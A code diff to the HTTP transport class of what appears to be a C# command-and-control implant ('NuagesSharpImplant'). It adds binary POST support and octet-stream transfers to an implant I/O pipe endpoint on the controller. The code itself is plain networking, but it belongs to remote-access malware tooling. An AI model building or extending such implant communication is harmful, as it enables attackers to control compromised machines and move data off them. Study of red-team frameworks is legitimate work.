@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
+using System.Text;
 
 namespace NuagesSharpImplant
 {
@@ -28,6 +29,10 @@ namespace NuagesSharpImplant
         public int getBufferSize()
         {
             return this.buffersize;
+        }
+
+        public bool supportsBinaryIO() {
+            return true;
         }
 
         public int getRefreshRate()
@@ -57,28 +62,43 @@ namespace NuagesSharpImplant
             return this.handler;
         }
 
-        public string POST(string url, string jsonContent)
+        public string POST(string url, string body)
+        {
+            return Encoding.ASCII.GetString(POST(url, Encoding.ASCII.GetBytes(body)));
+        }
+
+        public byte[] POST(string url, byte[] body)
         {
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.connectionString + url);
             request.Method = "POST";
 
-            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
-            Byte[] byteArray = encoding.GetBytes(jsonContent);
-
-            request.ContentLength = byteArray.Length;
-            request.ContentType = @"application/json";
+            request.ContentLength = body.Length;
+            if (url.Length > 30)
+            {
+                // Our url is /implant/io/:pipeId/:maxSize
+                request.ContentType = @"application/octet-stream";
+            }
+            else {
+                request.ContentType = @"application/json";
+            }
 
             using (Stream dataStream = request.GetRequestStream())
             {
-                dataStream.Write(byteArray, 0, byteArray.Length);
+                dataStream.Write(body, 0, body.Length);
             }
-
             using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
             {
                 using (Stream responseStream = response.GetResponseStream())
                 {
-                    StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.GetEncoding("utf-8"));
-                    return reader.ReadToEnd();
+                    MemoryStream ms = new MemoryStream();
+                    byte[] buffer = new byte[16384];
+                    int bytesRead;
+                    while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        ms.Write(buffer, 0, bytesRead);
+                    }
+                    byte[] b = ms.ToArray();
+                    return b;
                 }
             }
         }
